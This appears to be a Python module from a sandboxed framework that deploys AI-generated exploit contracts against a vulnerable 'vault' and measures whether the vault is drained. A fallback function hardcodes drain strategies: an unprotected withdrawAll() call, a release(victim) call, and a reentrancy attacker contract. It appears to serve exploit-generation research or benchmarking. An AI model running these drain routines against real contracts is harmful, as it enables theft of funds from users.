"""
Deploy and execute LLM-generated exploit contracts in the sandbox.
"""
import time

from orchestrator import chain, outcome
from orchestrator.proposer import ExploitProposal
from orchestrator.revert import clean_revert_reason
from orchestrator.sandbox import ExecutionResult, LocalSandbox

ATTACK_VALUE_WEI = 10**18


def _uses_contree(sandbox) -> bool:
    return hasattr(sandbox, "execute_attempt")


def _extract_revert_reason(exc: Exception) -> str:
    return clean_revert_reason(str(exc))


def _abi_functions(vault_abi: list) -> dict[str, dict]:
    """Map function name -> ABI entry for callable functions."""
    out = {}
    for entry in vault_abi:
        if entry.get("type") != "function":
            continue
        name = entry.get("name")
        if name:
            out[name] = entry
    return out


def _input_types(fn_abi: dict) -> list[str]:
    return [i.get("type", "") for i in fn_abi.get("inputs", [])]


def execute_proposal(
    sandbox: LocalSandbox,
    proposal: ExploitProposal,
    vault_address: str,
    vault_abi: list,
    deployer: str,
    sender: str | None = None,
) -> tuple[ExecutionResult, dict]:
    """
    Deploy generated attacker and run attack(). Returns result + timing.
    """
    timing = {"step": "execute", "duration_s": 0.0}
    start = time.time()

    if _uses_contree(sandbox):
        try:
            result = sandbox.execute_attempt(
                vault_address, vault_abi, proposal=proposal
            )
        except Exception as exc:
            result = ExecutionResult(
                success=False,
                attacker_balance_before=0,
                attacker_balance_after=0,
                vault_balance_before=sandbox.get_balance(vault_address),
                vault_balance_after=sandbox.get_balance(vault_address),
                revert_reason=_extract_revert_reason(exc),
                raw_tx_hashes=[],
                attacker_address=None,
            )
        timing["duration_s"] = time.time() - start
        return result, timing

    w3 = sandbox.w3
    tx_sender = sender or deployer
    vault_before = sandbox.get_balance(vault_address)
    attacker_before = 0
    raw_tx_hashes = []
    revert_reason = None
    attacker_address = None

    try:
        attacker = chain.deploy(
            w3,
            proposal.abi,
            proposal.bytecode,
            tx_sender,
            constructor_args=[vault_address],
        )
        attacker_address = attacker.address
        attacker_before = sandbox.get_balance(attacker_address)

        tx_hash = sandbox.send_tx(
            attacker,
            proposal.entry_function,
            args=[],
            value=proposal.entry_value_wei,
            sender=tx_sender,
        )
        raw_tx_hashes.append(tx_hash)
    except Exception as exc:
        revert_reason = _extract_revert_reason(exc)

    vault_after = sandbox.get_balance(vault_address)
    attacker_after = (
        sandbox.get_balance(attacker_address) if attacker_address else 0
    )

    success = outcome.is_drained(vault_before, vault_after) and not revert_reason
    timing["duration_s"] = time.time() - start

    return (
        ExecutionResult(
            success=success,
            attacker_balance_before=attacker_before,
            attacker_balance_after=attacker_after,
            vault_balance_before=vault_before,
            vault_balance_after=vault_after,
            revert_reason=revert_reason,
            raw_tx_hashes=raw_tx_hashes,
            attacker_address=attacker_address,
        ),
        timing,
    )


def fallback_exploit(
    sandbox: LocalSandbox,
    vault_address: str,
    vault_abi: list,
    deployer: str,
    target_name: str = "VulnerableVault",
    sender: str | None = None,
) -> tuple[ExecutionResult, dict]:
    """
    Safety-net fallback: ABI-driven heuristics only.

    Does NOT chain multi-step privilege escalations (e.g. changeOwner then
    withdrawAll). Those require an agent-generated exploit contract.
    """
    timing = {
        "step": "execute_fallback",
        "duration_s": 0.0,
        "strategy": "none",
        "label": "FALLBACK: ABI safety net",
    }
    start = time.time()

    if _uses_contree(sandbox):
        try:
            result = sandbox.execute_attempt(vault_address, vault_abi)
        except Exception as exc:
            result = ExecutionResult(
                success=False,
                attacker_balance_before=0,
                attacker_balance_after=0,
                vault_balance_before=sandbox.get_balance(vault_address),
                vault_balance_after=sandbox.get_balance(vault_address),
                revert_reason=_extract_revert_reason(exc),
                raw_tx_hashes=[],
                attacker_address=None,
            )
        timing["duration_s"] = time.time() - start
        timing["strategy"] = "contree"
        return result, timing

    w3 = sandbox.w3
    tx_sender = sender or deployer
    vault_before = sandbox.get_balance(vault_address)
    raw_tx_hashes = []
    revert_reason = None
    attacker_address = None
    attacker_before = 0
    attacker_after = 0
    fns = _abi_functions(vault_abi)

    try:
        target = w3.eth.contract(address=vault_address, abi=vault_abi)

        # 1) Direct drain if withdrawAll() takes no args (classic missing ACL).
        if "withdrawAll" in fns and _input_types(fns["withdrawAll"]) == []:
            timing["strategy"] = "direct_withdrawAll"
            timing["label"] = "FALLBACK: ABI withdrawAll()"
            attacker_address = tx_sender
            attacker_before = sandbox.get_balance(tx_sender)
            tx_hash = sandbox.send_tx(
                target, "withdrawAll", args=[], value=0, sender=tx_sender
            )
            raw_tx_hashes.append(tx_hash)

        # 2) Escrow-style release(address) paying msg.sender.
        elif (
            "release" in fns
            and _input_types(fns["release"]) == ["address"]
        ):
            timing["strategy"] = "release_victim"
            timing["label"] = "FALLBACK: ABI release(victim)"
            victim = w3.eth.accounts[1]
            attacker_address = tx_sender
            attacker_before = sandbox.get_balance(tx_sender)
            tx_hash = sandbox.send_tx(
                target, "release", args=[victim], value=0, sender=tx_sender
            )
            raw_tx_hashes.append(tx_hash)

        # 3) Classic reentrancy shape: deposit + withdraw, no args.
        elif (
            "deposit" in fns
            and "withdraw" in fns
            and _input_types(fns["withdraw"]) == []
            and "changeOwner" not in fns
        ):
            timing["strategy"] = "reentrancy_attacker"
            timing["label"] = "FALLBACK: Attacker.sol safety net"
            abi, bytecode = chain.compile_contract("Attacker.sol", "Attacker")
            attacker = chain.deploy(
                w3, abi, bytecode, tx_sender, constructor_args=[vault_address]
            )
            attacker_address = attacker.address
            attacker_before = sandbox.get_balance(attacker_address)
            tx_hash = sandbox.send_tx(
                attacker,
                "attack",
                args=[],
                value=ATTACK_VALUE_WEI,
                sender=tx_sender,
            )
            raw_tx_hashes.append(tx_hash)

        else:
            timing["strategy"] = "unsupported"
            timing["label"] = "FALLBACK: no ABI heuristic matched"
            revert_reason = (
                f"No ABI-driven fallback for {target_name}; "
                "agent must generate the exploit"
            )
    except Exception as exc:
        revert_reason = _extract_revert_reason(exc)

    vault_after = sandbox.get_balance(vault_address)
    if attacker_address:
        attacker_after = sandbox.get_balance(attacker_address)

    success = (
        outcome.is_drained(vault_before, vault_after)
        and not revert_reason
        and timing["strategy"] != "unsupported"
    )
    timing["duration_s"] = time.time() - start

    return (
        ExecutionResult(
            success=success,
            attacker_balance_before=attacker_before,
            attacker_balance_after=attacker_after,
            vault_balance_before=vault_before,
            vault_balance_after=vault_after,
            revert_reason=revert_reason,
            raw_tx_hashes=raw_tx_hashes,
            attacker_address=attacker_address,
        ),
        timing,
    )
